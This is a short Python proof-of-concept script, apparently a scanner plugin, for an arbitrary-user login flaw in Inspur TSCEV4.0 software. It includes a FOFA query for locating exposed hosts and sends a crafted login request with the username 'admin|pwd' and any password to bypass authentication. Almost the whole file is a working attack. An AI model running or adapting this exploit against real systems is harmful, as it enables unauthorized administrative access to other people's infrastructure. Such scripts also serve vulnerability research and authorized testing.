#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import sys
import requests
from Config.config_requests import ua
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 脚本信息
######################################################
NAME='Inspur_Any_user_login'
AUTHOR="Faith"
REMARK='浪潮任意用户登录漏洞'
FOFA_RULE='title="TSCEV4.0"'
######################################################

def poc(target):
    url = target + "/module/login/login.html"
    result = {}
    headers = {"User-Agent":ua}
    data = "op=login&username=admin|pwd&password=任意"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.post(url,data=data,headers=headers,verify=False,timeout=3)
        if r.status_code == 200:
            result['target'] = target
            result['poc'] = NAME
            result['url'] = url
            return result
        else:
            pass
    except:
        pass

if __name__ == '__main__':
    poc("https://127.0.0.1:8443/")